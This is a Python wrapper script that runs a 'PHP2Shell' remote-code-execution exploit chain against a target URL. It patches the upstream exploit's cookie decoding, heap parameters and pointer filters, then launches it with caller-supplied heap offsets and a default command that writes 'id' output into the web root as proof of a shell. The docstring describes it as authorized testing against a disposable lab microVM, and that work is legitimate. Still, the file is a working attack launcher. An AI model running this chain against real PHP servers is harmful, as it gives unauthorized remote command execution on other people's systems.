#!/usr/bin/env python3
"""Run the full PHP2Shell chain with an explicit stage-3 geometry.

The toolkit's `php2shell_rce.py` launcher is a thin wrapper around the pinned
9bie `exploit.py`; this script does the same thing, but forwards the
`--htdata-offset` value that a calibrated profile carries, and sets
`--no-auto-offsets` (there is no docker on the host or in the lab VM). The
runtime patches the toolkit applies in place (heap-parameter environment
overrides, Set-Cookie '+' decoding) are applied first with the toolkit's own
`php2shell_upstream` module -- the exploit code itself is never vendored or
modified by this repository.

A PROOF line is printed only by the upstream exploit after it has fetched a
real command output over HTTP. The runner independently re-fetches the proof
path and asserts uid=33(www-data).

Authorized testing only: the target is a loopback forward into a disposable
microVM created by this harness.
"""

from __future__ import annotations

import argparse
import os
import subprocess
import sys


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--target", required=True)
    ap.add_argument("--toolkit", required=True, help="pinned toolkit checkout")
    ap.add_argument("--repo-dir", required=True,
                    help="staged upstream-legacy checkout (exploit.py)")
    ap.add_argument("-c", "--command", default="id>/www/p")
    ap.add_argument("--profile", choices=("bookworm", "lab"), default="bookworm")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--htdata-offset", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--huge-mb", type=int, default=12)
    ap.add_argument("--fetch", default="/p")
    ap.add_argument("--retries", type=int, default=3)
    args = ap.parse_args()

    sys.path.insert(0, os.path.join(args.toolkit, "tools"))
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    try:
        from php2shell_upstream import patch_cookie_decode, patch_params
        from amd64 import patch_amd64_filters
    except Exception as exc:  # pragma: no cover - environment failure
        print(f"CHAIN_ERROR=import failed: {exc}", file=sys.stderr)
        return 3

    patch_params(args.repo_dir)
    patch_cookie_decode(args.repo_dir)
    # Narrow the toolkit's wide pointer filters back to amd64 userspace (see
    # amd64.py); without this a valid leak can parse as chunk=0x600000.
    patch_amd64_filters(args.repo_dir)

    exploit = os.path.join(args.repo_dir, "exploit.py")
    if not os.path.isfile(exploit):
        print(f"CHAIN_ERROR=missing {exploit}", file=sys.stderr)
        return 3

    cmd = [
        sys.executable, exploit,
        "-u", args.target,
        "-c", args.command,
        "--profile", args.profile,
        "--zif-offset", hex(args.zif_offset),
        "--dtor-offset", hex(args.dtor_offset),
        "--htdata-offset", hex(args.htdata_offset),
        "--proof-file", "",
        "--fetch", args.fetch,
        "--huge-mb", str(args.huge_mb),
        "--retries", str(args.retries),
        "--no-auto-offsets",
    ]
    print(f"[*] chain.py: {' '.join(cmd[:2])} ... htdata={hex(args.htdata_offset)} "
          f"huge_mb={args.huge_mb}", flush=True)
    return subprocess.call(cmd)


if __name__ == "__main__":
    sys.exit(main())
